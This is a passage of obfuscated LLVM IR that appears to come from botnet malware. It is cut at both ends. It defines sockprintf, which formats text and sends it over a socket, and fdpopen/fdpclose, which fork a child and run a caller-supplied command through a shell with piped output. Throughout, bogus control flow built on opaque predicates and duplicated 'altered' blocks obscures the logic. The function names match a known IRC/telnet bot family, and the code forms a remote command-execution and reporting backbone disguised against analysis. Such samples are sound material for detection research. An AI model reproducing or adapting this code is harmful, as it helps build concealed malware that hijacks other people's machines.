  %_24 = shl i32 %278, 48
  %_25 = sub i32 %278, 48
  %gen26 = mul i32 %_25, 48
  %279 = add nsw i32 %278, 48
  %280 = trunc i32 %279 to i8
  %281 = load i8*, i8** %25, align 8
  %282 = getelementptr inbounds i8, i8* %281, i32 -1
  store i8* %282, i8** %25, align 8
  store i8 %280, i8* %282, align 1
  %283 = load i32, i32* %19, align 4
  %284 = load i32, i32* %29, align 4
  %_27 = shl i32 %284, %283
  %_28 = sub i32 %284, %283
  %gen29 = mul i32 %_28, %283
  %_30 = shl i32 %284, %283
  %_31 = sub i32 %284, %283
  %gen32 = mul i32 %_31, %283
  %285 = udiv i32 %284, %283
  store i32 %285, i32* %29, align 4
  br label %originalBB22

originalBB36alteredBB:                            ; preds = %originalBB36, %173
  %286 = load i32, i32* %21, align 4
  %287 = icmp ne i32 %286, 0
  br label %originalBB36

originalBB40alteredBB:                            ; preds = %originalBB40, %196
  %288 = load i8**, i8*** %17, align 8
  call void @printchar(i8** %288, i32 45)
  %289 = load i32, i32* %28, align 4
  %290 = add nsw i32 %289, 1
  store i32 %290, i32* %28, align 4
  %291 = load i32, i32* %21, align 4
  %_41 = shl i32 %291, -1
  %_42 = sub i32 %291, -1
  %gen43 = mul i32 %_42, -1
  %_44 = sub i32 0, %291
  %gen45 = add i32 %_44, -1
  %292 = add nsw i32 %291, -1
  store i32 %292, i32* %21, align 4
  br label %originalBB40

originalBB49alteredBB:                            ; preds = %originalBB49, %218
  %293 = load i8*, i8** %25, align 8
  %294 = getelementptr inbounds i8, i8* %293, i32 -1
  store i8* %294, i8** %25, align 8
  store i8 45, i8* %294, align 1
  br label %originalBB49
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = load i32, i32* @x.13
  %4 = load i32, i32* @y.14
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  store i8** %0, i8*** %11, align 8
  store i32 %1, i32* %12, align 4
  %13 = load i8**, i8*** %11, align 8
  %14 = icmp ne i8** %13, null
  %15 = load i32, i32* @x.13
  %16 = load i32, i32* @y.14
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %14, label %23, label %47

; <label>:23:                                     ; preds = %originalBBpart2
  %24 = load i32, i32* @x.13
  %25 = load i32, i32* @y.14
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %23
  %32 = load i32, i32* %12, align 4
  %33 = trunc i32 %32 to i8
  %34 = load i8**, i8*** %11, align 8
  %35 = load i8*, i8** %34, align 8
  store i8 %33, i8* %35, align 1
  %36 = load i8**, i8*** %11, align 8
  %37 = load i8*, i8** %36, align 8
  %38 = getelementptr inbounds i8, i8* %37, i32 1
  store i8* %38, i8** %36, align 8
  %39 = load i32, i32* @x.13
  %40 = load i32, i32* @y.14
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %50

; <label>:47:                                     ; preds = %originalBBpart2
  %48 = bitcast i32* %12 to i8*
  %49 = call i64 @write(i32 1, i8* %48, i64 1)
  br label %50

; <label>:50:                                     ; preds = %47, %originalBBpart24
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %51 = alloca i8**, align 8
  %52 = alloca i32, align 4
  store i8** %0, i8*** %51, align 8
  store i32 %1, i32* %52, align 4
  %53 = load i8**, i8*** %51, align 8
  %54 = icmp ne i8** %53, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %23
  %55 = load i32, i32* %12, align 4
  %56 = trunc i32 %55 to i8
  %57 = load i8**, i8*** %11, align 8
  %58 = load i8*, i8** %57, align 8
  store i8 %56, i8* %58, align 1
  %59 = load i8**, i8*** %11, align 8
  %60 = load i8*, i8** %59, align 8
  %61 = getelementptr inbounds i8, i8* %60, i32 1
  store i8* %61, i8** %59, align 8
  br label %originalBB1
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #2

declare i64 @write(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = load i32, i32* @x.17
  %4 = load i32, i32* @y.18
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca [1 x %struct.__va_list_tag], align 16
  %16 = alloca i32, align 4
  store i32 %0, i32* %11, align 4
  store i8* %1, i8** %12, align 8
  %17 = call noalias i8* @malloc(i64 2048) #2
  store i8* %17, i8** %13, align 8
  %18 = load i8*, i8** %13, align 8
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 2048, i32 1, i1 false)
  %19 = load i8*, i8** %13, align 8
  store i8* %19, i8** %14, align 8
  %20 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %15, i32 0, i32 0
  %21 = bitcast %struct.__va_list_tag* %20 to i8*
  call void @llvm.va_start(i8* %21)
  %22 = load i8*, i8** %12, align 8
  %23 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %15, i32 0, i32 0
  %24 = call i32 @print(i8** %13, i8* %22, %struct.__va_list_tag* %23)
  %25 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %15, i32 0, i32 0
  %26 = bitcast %struct.__va_list_tag* %25 to i8*
  call void @llvm.va_end(i8* %26)
  %27 = load i8*, i8** %14, align 8
  %28 = load i8*, i8** %14, align 8
  %29 = call i64 @strlen(i8* %28) #10
  %30 = getelementptr inbounds i8, i8* %27, i64 %29
  store i8 10, i8* %30, align 1
  %31 = load i32, i32* %11, align 4
  %32 = load i8*, i8** %14, align 8
  %33 = load i8*, i8** %14, align 8
  %34 = call i64 @strlen(i8* %33) #10
  %35 = call i64 @send(i32 %31, i8* %32, i64 %34, i32 16384)
  %36 = trunc i64 %35 to i32
  store i32 %36, i32* %16, align 4
  %37 = load i8*, i8** %14, align 8
  call void @free(i8* %37) #2
  %38 = load i32, i32* %16, align 4
  %39 = load i32, i32* @x.17
  %40 = load i32, i32* @y.18
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %38

originalBBalteredBB:                              ; preds = %originalBB, %2
  %47 = alloca i32, align 4
  %48 = alloca i8*, align 8
  %49 = alloca i8*, align 8
  %50 = alloca i8*, align 8
  %51 = alloca [1 x %struct.__va_list_tag], align 16
  %52 = alloca i32, align 4
  store i32 %0, i32* %47, align 4
  store i8* %1, i8** %48, align 8
  %53 = call noalias i8* @malloc(i64 2048) #2
  store i8* %53, i8** %49, align 8
  %54 = load i8*, i8** %49, align 8
  call void @llvm.memset.p0i8.i64(i8* %54, i8 0, i64 2048, i32 1, i1 false)
  %55 = load i8*, i8** %49, align 8
  store i8* %55, i8** %50, align 8
  %56 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %51, i32 0, i32 0
  %57 = bitcast %struct.__va_list_tag* %56 to i8*
  call void @llvm.va_start(i8* %57)
  %58 = load i8*, i8** %48, align 8
  %59 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %51, i32 0, i32 0
  %60 = call i32 @print(i8** %49, i8* %58, %struct.__va_list_tag* %59)
  %61 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %51, i32 0, i32 0
  %62 = bitcast %struct.__va_list_tag* %61 to i8*
  call void @llvm.va_end(i8* %62)
  %63 = load i8*, i8** %50, align 8
  %64 = load i8*, i8** %50, align 8
  %65 = call i64 @strlen(i8* %64) #10
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  store i8 10, i8* %66, align 1
  %67 = load i32, i32* %47, align 4
  %68 = load i8*, i8** %50, align 8
  %69 = load i8*, i8** %50, align 8
  %70 = call i64 @strlen(i8* %69) #10
  %71 = call i64 @send(i32 %67, i8* %68, i64 %70, i32 16384)
  %72 = trunc i64 %71 to i32
  store i32 %72, i32* %52, align 4
  %73 = load i8*, i8** %50, align 8
  call void @free(i8* %73) #2
  %74 = load i32, i32* %52, align 4
  br label %originalBB
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  %13 = icmp ne i32 %12, 114
  br i1 %13, label %14, label %35

; <label>:14:                                     ; preds = %2
  %15 = load i32, i32* @x.19
  %16 = load i32, i32* @y.20
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %14
  %23 = load i8*, i8** %5, align 8
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp ne i32 %25, 119
  %27 = load i32, i32* @x.19
  %28 = load i32, i32* @y.20
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %26, label %41, label %35

; <label>:35:                                     ; preds = %originalBBpart2, %2
  %36 = load i8*, i8** %5, align 8
  %37 = getelementptr inbounds i8, i8* %36, i64 1
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %35, %originalBBpart2
  store i32 -1, i32* %3, align 4
  br label %253

; <label>:42:                                     ; preds = %35
  %43 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i32 0, i32 0
  %44 = call i32 @pipe(i32* %43) #2
  %45 = icmp slt i32 %44, 0
  br i1 %45, label %46, label %47

; <label>:46:                                     ; preds = %42
  store i32 -1, i32* %3, align 4
  br label %253

; <label>:47:                                     ; preds = %42
  %48 = load i32*, i32** @fdopen_pids, align 8
  %49 = icmp eq i32* %48, null
  br i1 %49, label %50, label %86

; <label>:50:                                     ; preds = %47
  %51 = load i32, i32* @x.19
  %52 = load i32, i32* @y.20
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %50
  %59 = call i32 @getdtablesize() #2
  store i32 %59, i32* %8, align 4
  %60 = icmp sle i32 %59, 0
  %61 = load i32, i32* @x.19
  %62 = load i32, i32* @y.20
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %60, label %69, label %70

; <label>:69:                                     ; preds = %originalBBpart24
  store i32 -1, i32* %3, align 4
  br label %253

; <label>:70:                                     ; preds = %originalBBpart24
  %71 = load i32, i32* %8, align 4
  %72 = sext i32 %71 to i64
  %73 = mul i64 %72, 4
  %74 = trunc i64 %73 to i32
  %75 = zext i32 %74 to i64
  %76 = call noalias i8* @malloc(i64 %75) #2
  %77 = bitcast i8* %76 to i32*
  store i32* %77, i32** @fdopen_pids, align 8
  %78 = icmp eq i32* %77, null
  br i1 %78, label %79, label %80

; <label>:79:                                     ; preds = %70
  store i32 -1, i32* %3, align 4
  br label %253

; <label>:80:                                     ; preds = %70
  %81 = load i32*, i32** @fdopen_pids, align 8
  %82 = bitcast i32* %81 to i8*
  %83 = load i32, i32* %8, align 4
  %84 = sext i32 %83 to i64
  %85 = mul i64 %84, 4
  call void @llvm.memset.p0i8.i64(i8* %82, i8 0, i64 %85, i32 1, i1 false)
  br label %86

; <label>:86:                                     ; preds = %80, %47
  %87 = load i32, i32* @x.19
  %88 = load i32, i32* @y.20
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %86
  %95 = call i32 @vfork() #11
  store i32 %95, i32* %9, align 4
  %96 = load i32, i32* @x.19
  %97 = load i32, i32* @y.20
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  switch i32 %95, label %197 [
    i32 -1, label %104
    i32 0, label %111
  ]

; <label>:104:                                    ; preds = %originalBBpart28
  %105 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %106 = load i32, i32* %105, align 4
  %107 = call i32 @close(i32 %106)
  %108 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %109 = load i32, i32* %108, align 4
  %110 = call i32 @close(i32 %109)
  store i32 -1, i32* %3, align 4
  br label %253

; <label>:111:                                    ; preds = %originalBBpart28
  %112 = load i8*, i8** %5, align 8
  %113 = load i8, i8* %112, align 1
  %114 = zext i8 %113 to i32
  %115 = icmp eq i32 %114, 114
  br i1 %115, label %116, label %163

; <label>:116:                                    ; preds = %111
  %117 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %118 = load i32, i32* %117, align 4
  %119 = icmp ne i32 %118, 1
  br i1 %119, label %120, label %143

; <label>:120:                                    ; preds = %116
  %121 = load i32, i32* @x.19
  %122 = load i32, i32* @y.20
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %120
  %129 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %130 = load i32, i32* %129, align 4
  %131 = call i32 @dup2(i32 %130, i32 1) #2
  %132 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %133 = load i32, i32* %132, align 4
  %134 = call i32 @close(i32 %133)
  %135 = load i32, i32* @x.19
  %136 = load i32, i32* @y.20
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %143

; <label>:143:                                    ; preds = %originalBBpart212, %116
  %144 = load i32, i32* @x.19
  %145 = load i32, i32* @y.20
  %146 = sub i32 %144, 1
  %147 = mul i32 %144, %146
  %148 = urem i32 %147, 2
  %149 = icmp eq i32 %148, 0
  %150 = icmp slt i32 %145, 10
  %151 = or i1 %149, %150
  br i1 %151, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %143
  %152 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %153 = load i32, i32* %152, align 4
  %154 = call i32 @close(i32 %153)
  %155 = load i32, i32* @x.19
  %156 = load i32, i32* @y.20
  %157 = sub i32 %155, 1
  %158 = mul i32 %155, %157
  %159 = urem i32 %158, 2
  %160 = icmp eq i32 %159, 0
  %161 = icmp slt i32 %156, 10
  %162 = or i1 %160, %161
  br i1 %162, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %194

; <label>:163:                                    ; preds = %111
  %164 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %165 = load i32, i32* %164, align 4
  %166 = icmp ne i32 %165, 0
  br i1 %166, label %167, label %174

; <label>:167:                                    ; preds = %163
  %168 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %169 = load i32, i32* %168, align 4
  %170 = call i32 @dup2(i32 %169, i32 0) #2
  %171 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %172 = load i32, i32* %171, align 4
  %173 = call i32 @close(i32 %172)
  br label %174

; <label>:174:                                    ; preds = %167, %163
  %175 = load i32, i32* @x.19
  %176 = load i32, i32* @y.20
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %174
  %183 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %184 = load i32, i32* %183, align 4
  %185 = call i32 @close(i32 %184)
  %186 = load i32, i32* @x.19
  %187 = load i32, i32* @y.20
  %188 = sub i32 %186, 1
  %189 = mul i32 %186, %188
  %190 = urem i32 %189, 2
  %191 = icmp eq i32 %190, 0
  %192 = icmp slt i32 %187, 10
  %193 = or i1 %191, %192
  br i1 %193, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %194

; <label>:194:                                    ; preds = %originalBBpart220, %originalBBpart216
  %195 = load i8*, i8** %4, align 8
  %196 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.130, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.131, i32 0, i32 0), i8* %195, i8* null) #2
  call void @_exit(i32 127) #12
  unreachable

; <label>:197:                                    ; preds = %originalBBpart28
  %198 = load i8*, i8** %5, align 8
  %199 = load i8, i8* %198, align 1
  %200 = zext i8 %199 to i32
  %201 = icmp eq i32 %200, 114
  br i1 %201, label %202, label %224

; <label>:202:                                    ; preds = %197
  %203 = load i32, i32* @x.19
  %204 = load i32, i32* @y.20
  %205 = sub i32 %203, 1
  %206 = mul i32 %203, %205
  %207 = urem i32 %206, 2
  %208 = icmp eq i32 %207, 0
  %209 = icmp slt i32 %204, 10
  %210 = or i1 %208, %209
  br i1 %210, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %202
  %211 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %212 = load i32, i32* %211, align 4
  store i32 %212, i32* %6, align 4
  %213 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %214 = load i32, i32* %213, align 4
  %215 = call i32 @close(i32 %214)
  %216 = load i32, i32* @x.19
  %217 = load i32, i32* @y.20
  %218 = sub i32 %216, 1
  %219 = mul i32 %216, %218
  %220 = urem i32 %219, 2
  %221 = icmp eq i32 %220, 0
  %222 = icmp slt i32 %217, 10
  %223 = or i1 %221, %222
  br i1 %223, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %230

; <label>:224:                                    ; preds = %197
  %225 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %226 = load i32, i32* %225, align 4
  store i32 %226, i32* %6, align 4
  %227 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %228 = load i32, i32* %227, align 4
  %229 = call i32 @close(i32 %228)
  br label %230

; <label>:230:                                    ; preds = %224, %originalBBpart224
  %231 = load i32, i32* @x.19
  %232 = load i32, i32* @y.20
  %233 = sub i32 %231, 1
  %234 = mul i32 %231, %233
  %235 = urem i32 %234, 2
  %236 = icmp eq i32 %235, 0
  %237 = icmp slt i32 %232, 10
  %238 = or i1 %236, %237
  br i1 %238, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %230
  %239 = load i32, i32* %9, align 4
  %240 = load i32*, i32** @fdopen_pids, align 8
  %241 = load i32, i32* %6, align 4
  %242 = sext i32 %241 to i64
  %243 = getelementptr inbounds i32, i32* %240, i64 %242
  store i32 %239, i32* %243, align 4
  %244 = load i32, i32* %6, align 4
  store i32 %244, i32* %3, align 4
  %245 = load i32, i32* @x.19
  %246 = load i32, i32* @y.20
  %247 = sub i32 %245, 1
  %248 = mul i32 %245, %247
  %249 = urem i32 %248, 2
  %250 = icmp eq i32 %249, 0
  %251 = icmp slt i32 %246, 10
  %252 = or i1 %250, %251
  br i1 %252, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %253

; <label>:253:                                    ; preds = %originalBBpart228, %104, %79, %69, %46, %41
  %254 = load i32, i32* %3, align 4
  ret i32 %254

originalBBalteredBB:                              ; preds = %originalBB, %14
  %255 = load i8*, i8** %5, align 8
  %256 = load i8, i8* %255, align 1
  %257 = zext i8 %256 to i32
  %258 = icmp ne i32 %257, 119
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %50
  %259 = call i32 @getdtablesize() #2
  store i32 %259, i32* %8, align 4
  %260 = icmp sle i32 %259, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %86
  %261 = call i32 @vfork() #11
  store i32 %261, i32* %9, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %120
  %262 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %263 = load i32, i32* %262, align 4
  %264 = call i32 @dup2(i32 %263, i32 1) #2
  %265 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %266 = load i32, i32* %265, align 4
  %267 = call i32 @close(i32 %266)
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %143
  %268 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %269 = load i32, i32* %268, align 4
  %270 = call i32 @close(i32 %269)
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %174
  %271 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %272 = load i32, i32* %271, align 4
  %273 = call i32 @close(i32 %272)
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %202
  %274 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %275 = load i32, i32* %274, align 4
  store i32 %275, i32* %6, align 4
  %276 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %277 = load i32, i32* %276, align 4
  %278 = call i32 @close(i32 %277)
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %230
  %279 = load i32, i32* %9, align 4
  %280 = load i32*, i32** @fdopen_pids, align 8
  %281 = load i32, i32* %6, align 4
  %282 = sext i32 %281 to i64
  %283 = getelementptr inbounds i32, i32* %280, i64 %282
  store i32 %279, i32* %283, align 4
  %284 = load i32, i32* %6, align 4
  store i32 %284, i32* %3, align 4
  br label %originalBB26
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #4

; Function Attrs: nounwind
declare i32 @getdtablesize() #4

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #4

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #4

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %3, align 4
  %10 = load i32*, i32** @fdopen_pids, align 8
  %11 = icmp eq i32* %10, null
  br i1 %11, label %19, label %12

; <label>:12:                                     ; preds = %1
  %13 = load i32*, i32** @fdopen_pids, align 8
  %14 = load i32, i32* %3, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i32, i32* %13, i64 %15
  %17 = load i32, i32* %16, align 4
  %18 = icmp eq i32 %17, 0
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %12, %1
  store i32 -1, i32* %2, align 4
  br label %126

; <label>:20:                                     ; preds = %12
  %21 = load i32, i32* @x.21
  %22 = load i32, i32* @y.22
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %20
  %29 = load i32, i32* %3, align 4
  %30 = call i32 @close(i32 %29)
  %31 = call i32 @sigemptyset(%struct.__sigset_t* %6) #2
  %32 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #2
  %33 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #2
  %34 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #2
  %35 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #2
  %36 = load i32, i32* @x.21
  %37 = load i32, i32* @y.22
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %44

; <label>:44:                                     ; preds = %74, %originalBBpart2
  %45 = load i32, i32* @x.21
  %46 = load i32, i32* @y.22
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %44
  %53 = load i32*, i32** @fdopen_pids, align 8
  %54 = load i32, i32* %3, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds i32, i32* %53, i64 %55
  %57 = load i32, i32* %56, align 4
  %58 = call i32 @waitpid(i32 %57, i32* %7, i32 0)
  store i32 %58, i32* %8, align 4
  %59 = load i32, i32* @x.21
  %60 = load i32, i32* @y.22
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
